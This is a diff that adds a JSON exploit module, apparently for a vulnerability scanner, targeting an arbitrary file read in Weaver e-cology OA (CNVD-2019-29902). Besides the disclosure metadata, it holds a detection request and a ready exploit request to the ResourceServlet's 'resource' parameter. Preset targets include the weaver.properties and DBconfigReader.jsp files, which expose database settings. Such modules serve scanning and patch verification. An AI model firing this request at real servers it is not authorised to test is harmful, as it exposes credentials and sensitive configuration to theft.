@@ -1,0 +1,78 @@
+{
+  "Name": "Weaver e-cology OA file read (CNVD-2019-29902)",
+  "Description": "Weaver e-cology OA has an arbitrary file reading vulnerability, which can be exploited by attackers to obtain sensitive information.",
+  "Product": "Weaver-OA",
+  "Homepage": "http://www.weaver.com.cn/",
+  "DisclosureDate": "2019-09-18",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"Weaver-OA\"",
+  "Level": "2",
+  "Impact": "Attackers can use this vulnerability to obtain sensitive information.",
+  "Recommendation": "The manufacturer has provided a repair plan, and it is recommended to download the update.",
+  "References": [
+    "https://github.com/jas502n/DBconfigReader/blob/master/README.md"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "file",
+      "type": "createSelect",
+      "value": "/WEB-INF/prop/weaver.properties,/mobile/DBconfigReader.jsp",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "GET",
+        "uri": "/weaver/org.springframework.web.servlet.ResourceServlet"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "No target resource URL found for request",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "GET",
+        "uri": "/weaver/org.springframework.web.servlet.ResourceServlet?resource={{{file}}}"
+      },
+      "SetVariable": [
+        "output|lastbody"
+      ]
+    }
+  ],
+  "Tags": ["fileread"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["Weaver-OA"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
